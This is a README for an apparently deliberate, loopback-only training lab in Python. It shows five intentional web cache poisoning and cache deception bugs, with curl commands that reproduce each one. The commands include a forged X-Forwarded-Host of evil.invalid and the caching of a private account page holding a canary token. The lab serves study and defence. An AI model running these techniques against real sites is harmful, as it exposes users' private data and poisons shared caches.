# cachelab — a cache that keys on too little

Two tiers that disagree, in stdlib Python, loopback only. `cachelab.py` runs
both: an **origin** that normalizes like a framework, and an **edge** cache in
front of it whose key is (method, raw request target, first value of each
parameter) and nothing else.

    python3 lab/cachelab/cachelab.py              # edge 5027, origin 5028
    python3 lab/cachelab/cachelab.py --edge-port 8080 --origin-port 8081

It binds `127.0.0.1` and refuses any other address unless
`CACHELAB_ALLOW_ANY_BIND=1` is set, which only the container image does — the
compose service publishes on loopback, so the exposure is the same either way.
Every fake credential is the single canary string `MYTHOS_LAB_CANARY`, and the
owner's session cookie is `session=owner-session-MYTHOS_LAB_CANARY`.

`scripts/cache selftest` imports this file rather than carrying a copy of it,
so there is one description of each bug.

## The five bugs

| # | bug | where |
|---|---|---|
| 1 | `X-Forwarded-Host` is unkeyed and reflected into an absolute URL | `/` |
| 2 | a path ending in a static extension is stored even when the origin said `private, no-store` | `/account/profile.css`, `/account;.js`, `/account%0a.js` |
| 3 | a method-override header or `_method` turns a cacheable GET into the origin's POST handler | `/api/item` |
| 4 | the edge keys the **first** occurrence of a repeated parameter, the origin reads the **last** | any path, `?x=A&x=B` |
| 5 | the edge forwards `%2e%2e`, `%2f`, `;` and dot segments verbatim, so the key is not the path the origin served | `/static/..%2fecho` |

A client `Cache-Control: no-cache` or `Pragma: no-cache` evicts the entry and
refetches, which is what the cleanup step of `scripts/cache` relies on.

## Routes

| route | what it does |
|---|---|
| `/` | front page; reflects `X-Forwarded-Host` into `<link rel=canonical>` and a script URL. `public, max-age=60` |
| `/static/<anything>` | plain static, `public, max-age=300` |
| `/account` | the owner's page: email, `api_token: MYTHOS_LAB_CANARY`, a reset token. `private, no-store`, 401 without the session cookie. The route matches anything that *starts* with `/account`, which is bug 2's origin half |
| `/api/item` | 405 unless the effective method is POST; honours `X-HTTP-Method-Override`, `X-Method-Override`, `X-HTTP-Method` and `_method`. The POST answer is `public, max-age=60` |
| `/echo` | echoes the resolved path, the raw request target, the effective method, `X-Forwarded-Host`, the body length, the last `cb` and the last `x`. The observation window for bugs 4 and 5 |

## Reproduce by hand

    E=http://127.0.0.1:5027
    # 1 — unkeyed reflected header
    curl -s -H 'X-Forwarded-Host: evil.invalid' "$E/?cb=t1" >/dev/null
    curl -si "$E/?cb=t1" | grep -E 'X-Cache|canonical'
    # 2 — a private page served anonymously
    curl -s -b 'session=owner-session-MYTHOS_LAB_CANARY' "$E/account/profile.css" >/dev/null
    curl -si "$E/account/profile.css" | grep -E 'X-Cache|api_token'
    # 3 — fat GET
    curl -si "$E/api/item" | head -1                                  # 405
    curl -si -H 'X-HTTP-Method-Override: POST' "$E/api/item" | tail -1 # the POST body
    # 4 — parameter cloaking: the edge keys x=A, the origin answers with x=B
    curl -s "$E/echo?cb=t4&x=A&x=B"   # -> "x_last": "B"
    curl -s "$E/echo?cb=t4&x=A"       # -> the same cached answer, still "x_last": "B"
    # 5 — normalization. --path-as-is matters: curl resolves dot segments itself,
    # which is why scripts/cache writes its own bytes
    curl -s --path-as-is "$E/static/..%2fecho?cb=t5"
    # clean up after yourself
    curl -s -H 'Cache-Control: no-cache' "$E/?cb=t1" >/dev/null
